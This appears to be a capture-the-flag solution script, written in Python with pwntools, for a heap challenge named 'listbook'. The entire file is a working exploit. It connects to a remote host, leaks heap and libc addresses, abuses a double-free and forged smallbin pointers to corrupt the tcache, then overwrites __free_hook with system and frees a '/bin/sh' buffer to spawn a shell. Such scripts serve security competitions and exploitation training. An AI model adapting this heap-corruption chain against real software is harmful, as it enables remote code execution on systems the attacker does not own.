# Solved with Yu-Fu Fu
from pwn import *

# os.environ["LD_PRELOAD"] = "./libc-2.31.so"
# con = process("./listbook")
con = remote("111.186.58.249", 20001)


def create_book(name, content):
    con.recvuntil(b">>")
    con.sendline("1")
    con.recvuntil(b"name>")
    if len(name) >= 16:
        con.send(name[:16])
    else:
        con.sendline(name)
    con.recvuntil(b"content>")
    if len(content) >= 512:
        con.send(content[:512])
    else:
        con.sendline(content)

    count = 0
    for c in name[:16]:
        count += c
    count = count % 16

    return count


def delete_book(index):
    con.recvuntil(b">>")
    con.sendline("2")
    con.recvuntil("index>")
    con.sendline(str(index))


def show_book(index):
    con.recvuntil(b">>")
    con.sendline("3")
    con.recvuntil("index>")
    con.sendline(str(index))


def name(index):
    return b"a" * 15 + bytes([ord("a") + index])


# Share the content buffer
create_book(name(0), "aaa")
delete_book(0)
create_book(name(1), "aaa")

# Heap leak
create_book(name(4), "xxx")
create_book(name(4), "xxx")
show_book(4)
con.recvuntil(b"aaaaaaaaaaaaaaae")
heap_leak = u64(con.recvuntil(b"=>", drop=True).strip().ljust(8, b"\x00"))
log.info("Heap Leak: 0x%08x" % heap_leak)

# Fill up tcache
create_book(name(4), "xxx")
create_book(name(4), "xxx")
create_book(name(4), "xxx")
create_book(name(4), "xxx")
create_book(name(4), "xxx")
create_book(name(5), "xxx")
create_book(name(6), "xxx")
delete_book(4)

# Victim chunk in unsorted bin
delete_book(5)
delete_book(1)

# Will be allocated from tcache
create_book(b"\x80", "333")

# Libc leak
show_book(0)
con.recvuntil(b"=>")
libc_leak = u64(con.recvline().strip().ljust(8, b"\x00"))
log.info("Libc Leak: 0x%08x" % libc_leak)

# Double-free, goes to tcache
delete_book(0)

# Leak = 0x559549ca3510
# b = 0x559549ca32d0 <- address of overwritten fd and bk, use -16 for chunk addr
# c = 0x559549ca3780 <- address of the next buffer
b = heap_leak - 0x559549CA3510 + 0x559549CA32D0
c = heap_leak - 0x559549CA3510 + 0x559549CA3780

test = 0x7FFFF7FBCB28
# Overwrite fd and bk of smallbin
create_book(name(2), p64(0x1234) + p64(c))

# 0x180 + (0, 0x211, b, anywhere)
payload = p64(0) + p64(0x211) + p64(b - 0x10) + p64(c + 0x20)

t = 4
for i in range(4):
    payload += p64(0) + p64(0x211) + p64(c + 0x20 * i) + p64(c + 0x40 + 0x20 * i)

tcache = heap_leak - 0x555555559510 + 0x555555559170

payload += p64(0) + p64(0x211) + p64(c + 0x20 * 5) + p64(tcache)

create_book(name(3), payload)
create_book(name(3), "zzz")
create_book(name(3), "zzz")
create_book(name(3), "zzz")
create_book(name(3), "zzz")
create_book(name(3), "zzz")

# trigger!
create_book(name(3), "zzz")

free_hook = libc_leak - 0x7F91E5EFDDE0 + 0x7F91E5F00B28
system = libc_leak - 0x7F91E5EFDDE0 + 0x7F91E5D67410
create_book(name(3), p64(free_hook - 8) * 2)
create_book(name(4), b"/bin/sh\x00" + p64(system))
delete_book(4)

con.interactive()
